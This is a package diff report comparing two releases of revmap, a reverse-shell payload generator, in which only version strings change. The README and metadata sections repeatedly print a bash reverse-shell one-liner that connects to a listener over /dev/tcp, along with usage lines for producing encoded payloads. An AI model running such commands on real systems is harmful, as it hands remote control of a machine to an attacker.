# Comparing `tmp/revmap-0.0.3.tar.gz` & `tmp/revmap-0.0.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "revmap-0.0.3.tar", last modified: Thu May 25 23:57:21 2023, max compression
+gzip compressed data, was "revmap-0.0.4.tar", last modified: Fri May 26 00:10:59 2023, max compression
```

## Comparing `revmap-0.0.3.tar` & `revmap-0.0.4.tar`

### file list

```diff
@@ -1,22 +1,22 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-25 23:57:21.719035 revmap-0.0.3/
--rw-r--r--   0 runner    (1001) docker     (123)     1078 2023-05-25 23:57:11.000000 revmap-0.0.3/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)     4149 2023-05-25 23:57:21.719035 revmap-0.0.3/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)     2813 2023-05-25 23:57:11.000000 revmap-0.0.3/README.md
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-25 23:57:21.719035 revmap-0.0.3/revmap/
--rw-r--r--   0 runner    (1001) docker     (123)       69 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       73 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)      365 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/__meta__.py
--rw-r--r--   0 runner    (1001) docker     (123)      522 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/encoded.py
--rw-r--r--   0 runner    (1001) docker     (123)     3922 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/payloads.py
--rw-r--r--   0 runner    (1001) docker     (123)     4733 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/revmap.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-25 23:57:21.719035 revmap-0.0.3/revmap.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     4149 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      336 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       52 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/entry_points.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/not-zip-safe
--rw-r--r--   0 runner    (1001) docker     (123)       12 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-25 23:57:21.719035 revmap-0.0.3/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     1838 2023-05-25 23:57:11.000000 revmap-0.0.3/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-25 23:57:21.719035 revmap-0.0.3/test/
--rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-25 23:57:11.000000 revmap-0.0.3/test/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:10:59.355746 revmap-0.0.4/
+-rw-r--r--   0 runner    (1001) docker     (123)     1078 2023-05-26 00:10:44.000000 revmap-0.0.4/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)     4149 2023-05-26 00:10:59.355746 revmap-0.0.4/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)     2813 2023-05-26 00:10:44.000000 revmap-0.0.4/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:10:59.355746 revmap-0.0.4/revmap/
+-rw-r--r--   0 runner    (1001) docker     (123)       69 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       73 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      365 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/__meta__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      522 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/encoded.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3922 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/payloads.py
+-rw-r--r--   0 runner    (1001) docker     (123)     4733 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/revmap.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:10:59.355746 revmap-0.0.4/revmap.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     4149 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      336 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       52 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/entry_points.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/not-zip-safe
+-rw-r--r--   0 runner    (1001) docker     (123)       12 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-26 00:10:59.355746 revmap-0.0.4/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     1838 2023-05-26 00:10:44.000000 revmap-0.0.4/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:10:59.355746 revmap-0.0.4/test/
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-26 00:10:44.000000 revmap-0.0.4/test/__init__.py
```

### Comparing `revmap-0.0.3/LICENSE` & `revmap-0.0.4/LICENSE`

 * *Files identical despite different names*

### Comparing `revmap-0.0.3/PKG-INFO` & `revmap-0.0.4/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: revmap
-Version: 0.0.3
+Version: 0.0.4
 Summary: Tool that generates reverse shell in multiple languages and encodes
 Home-page: https://github.com/joaoviictorti/revmap
 Author: joaoviictorti (viictorjj)
 Author-email: joaovictorti08@gmail.com
 License: MIT License
 Keywords: revshell shell python security
 Classifier: Development Status :: 5 - Production/Stable
@@ -68,15 +68,15 @@
 ```
 Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
 ```yaml
  ___ ___ _ _ _____ ___ ___ 
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.1 - @joaoviictorti 
+        v0.0.4 - @joaoviictorti 
 
 options:
   --h, --help            show this help message and exit
   --version             show program's version number and exit
   --ip IP                Insert ip
   --port PORTA           Insert port
   --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
@@ -96,15 +96,15 @@
 ```console
 revmap --ip 192.168.4.160 --port 8080 --payload bash
 
  ___ ___ _ _ _____ ___ ___ 
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.1 - @joaoviictorti 
+        v0.0.4 - @joaoviictorti 
                                                
 
 bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
 ```
 
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: revmap Version: 0.0.3 Summary: Tool that generates
+Metadata-Version: 2.1 Name: revmap Version: 0.0.4 Summary: Tool that generates
 reverse shell in multiple languages and encodes Home-page: https://github.com/
 joaoviictorti/revmap Author: joaoviictorti (viictorjj) Author-email:
 joaovictorti08@gmail.com License: MIT License Keywords: revshell shell python
 security Classifier: Development Status :: 5 - Production/Stable Classifier:
 Environment :: Console Classifier: Intended Audience :: System Administrators
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Natural Language :: English Classifier: Operating System :: OS
@@ -34,18 +34,18 @@
 Funcionalidade de realizar encode das payloads desejadas (Url encode, base64,
 hexadecimal e etc) # Forma de utilizaÃ§Ã£o ```sh revmap --ip 192.168.4.80 --
 port 4444 --payload bash --encode urlencode revmap --ip 192.168.4.80 --port
 4444 --payload bash revmap --ip 192.168.4.80 --port 4444 --payload python
 revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64 ``` Isso
 exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os switches que ele
 suporta: ```yaml ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.1 - @joaoviictorti options: --h, --help show this help
+|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti options: --h, --help show this help
 message and exit --version show program's version number and exit --ip IP
 Insert ip --port PORTA Insert port --payload
 {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang}
 Insert payload --encode {base64,hex,urlencode} Insert encode ``` # InstalaÃ§Ã£o
 revmap requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install revmap
 ``` # Executando revmap ```console revmap --ip 192.168.4.160 --port 8080 --
 payload bash ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.1 - @joaoviictorti bash -c 'exec bash -i &>/dev/tcp/
+|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti bash -c 'exec bash -i &>/dev/tcp/
 192.168.4.160/8080 <&1' ``` [https://capsule-render.vercel.app/
 api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `revmap-0.0.3/README.md` & `revmap-0.0.4/README.md`

 * *Files 1% similar despite different names*

```diff
@@ -36,15 +36,15 @@
 ```
 Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
 ```yaml
  ___ ___ _ _ _____ ___ ___ 
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.1 - @joaoviictorti 
+        v0.0.4 - @joaoviictorti 
 
 options:
   --h, --help            show this help message and exit
   --version             show program's version number and exit
   --ip IP                Insert ip
   --port PORTA           Insert port
   --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
@@ -64,15 +64,15 @@
 ```console
 revmap --ip 192.168.4.160 --port 8080 --payload bash
 
  ___ ___ _ _ _____ ___ ___ 
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.1 - @joaoviictorti 
+        v0.0.4 - @joaoviictorti 
                                                
 
 bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
 ```
 
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -17,18 +17,18 @@
 Funcionalidade de realizar encode das payloads desejadas (Url encode, base64,
 hexadecimal e etc) # Forma de utilizaÃ§Ã£o ```sh revmap --ip 192.168.4.80 --
 port 4444 --payload bash --encode urlencode revmap --ip 192.168.4.80 --port
 4444 --payload bash revmap --ip 192.168.4.80 --port 4444 --payload python
 revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64 ``` Isso
 exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os switches que ele
 suporta: ```yaml ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.1 - @joaoviictorti options: --h, --help show this help
+|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti options: --h, --help show this help
 message and exit --version show program's version number and exit --ip IP
 Insert ip --port PORTA Insert port --payload
 {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang}
 Insert payload --encode {base64,hex,urlencode} Insert encode ``` # InstalaÃ§Ã£o
 revmap requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install revmap
 ``` # Executando revmap ```console revmap --ip 192.168.4.160 --port 8080 --
 payload bash ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.1 - @joaoviictorti bash -c 'exec bash -i &>/dev/tcp/
+|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti bash -c 'exec bash -i &>/dev/tcp/
 192.168.4.160/8080 <&1' ``` [https://capsule-render.vercel.app/
 api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `revmap-0.0.3/revmap/encoded.py` & `revmap-0.0.4/revmap/encoded.py`

 * *Files identical despite different names*

### Comparing `revmap-0.0.3/revmap/payloads.py` & `revmap-0.0.4/revmap/payloads.py`

 * *Files identical despite different names*

### Comparing `revmap-0.0.3/revmap/revmap.py` & `revmap-0.0.4/revmap/revmap.py`

 * *Files 1% similar despite different names*

```diff
@@ -5,15 +5,15 @@
 
 def banner():
     return """
  ___ ___ _ _ _____ ___ ___ 
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.1 - @joaoviictorti                          
+        v0.0.4 - @joaoviictorti                          
 """
 
 
 def argumentos():
     global args
     parser = argparse.ArgumentParser(
         prog=banner(),
```

### Comparing `revmap-0.0.3/revmap.egg-info/PKG-INFO` & `revmap-0.0.4/revmap.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: revmap
-Version: 0.0.3
+Version: 0.0.4
 Summary: Tool that generates reverse shell in multiple languages and encodes
 Home-page: https://github.com/joaoviictorti/revmap
 Author: joaoviictorti (viictorjj)
 Author-email: joaovictorti08@gmail.com
 License: MIT License
 Keywords: revshell shell python security
 Classifier: Development Status :: 5 - Production/Stable
@@ -68,15 +68,15 @@
 ```
 Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
 ```yaml
  ___ ___ _ _ _____ ___ ___ 
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.1 - @joaoviictorti 
+        v0.0.4 - @joaoviictorti 
 
 options:
   --h, --help            show this help message and exit
   --version             show program's version number and exit
   --ip IP                Insert ip
   --port PORTA           Insert port
   --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
@@ -96,15 +96,15 @@
 ```console
 revmap --ip 192.168.4.160 --port 8080 --payload bash
 
  ___ ___ _ _ _____ ___ ___ 
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.1 - @joaoviictorti 
+        v0.0.4 - @joaoviictorti 
                                                
 
 bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
 ```
 
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: revmap Version: 0.0.3 Summary: Tool that generates
+Metadata-Version: 2.1 Name: revmap Version: 0.0.4 Summary: Tool that generates
 reverse shell in multiple languages and encodes Home-page: https://github.com/
 joaoviictorti/revmap Author: joaoviictorti (viictorjj) Author-email:
 joaovictorti08@gmail.com License: MIT License Keywords: revshell shell python
 security Classifier: Development Status :: 5 - Production/Stable Classifier:
 Environment :: Console Classifier: Intended Audience :: System Administrators
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Natural Language :: English Classifier: Operating System :: OS
@@ -34,18 +34,18 @@
 Funcionalidade de realizar encode das payloads desejadas (Url encode, base64,
 hexadecimal e etc) # Forma de utilizaÃ§Ã£o ```sh revmap --ip 192.168.4.80 --
 port 4444 --payload bash --encode urlencode revmap --ip 192.168.4.80 --port
 4444 --payload bash revmap --ip 192.168.4.80 --port 4444 --payload python
 revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64 ``` Isso
 exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os switches que ele
 suporta: ```yaml ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.1 - @joaoviictorti options: --h, --help show this help
+|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti options: --h, --help show this help
 message and exit --version show program's version number and exit --ip IP
 Insert ip --port PORTA Insert port --payload
 {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang}
 Insert payload --encode {base64,hex,urlencode} Insert encode ``` # InstalaÃ§Ã£o
 revmap requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install revmap
 ``` # Executando revmap ```console revmap --ip 192.168.4.160 --port 8080 --
 payload bash ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.1 - @joaoviictorti bash -c 'exec bash -i &>/dev/tcp/
+|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti bash -c 'exec bash -i &>/dev/tcp/
 192.168.4.160/8080 <&1' ``` [https://capsule-render.vercel.app/
 api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `revmap-0.0.3/setup.py` & `revmap-0.0.4/setup.py`

 * *Files identical despite different names*

